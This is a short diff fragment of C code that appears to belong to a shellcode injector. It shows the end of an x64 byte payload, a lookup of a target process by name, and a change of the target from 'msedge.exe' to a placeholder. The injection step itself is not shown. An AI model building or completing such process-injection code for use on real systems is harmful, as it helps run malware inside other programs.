@@ -61,7 +61,7 @@ unsigned char buf[] = //x64
 "\x72\x33\x32\x2e\x64\x6c\x6c\x00";
 int main(int argc, char** argv)
 {
-    const wchar_t* processname = L"msedge.exe";
+    const wchar_t* processname = L"process_name.exe";
     DWORD pID = FindProcessId(processname);
     if (pID == NULL) {
         printf("Can't find process!");
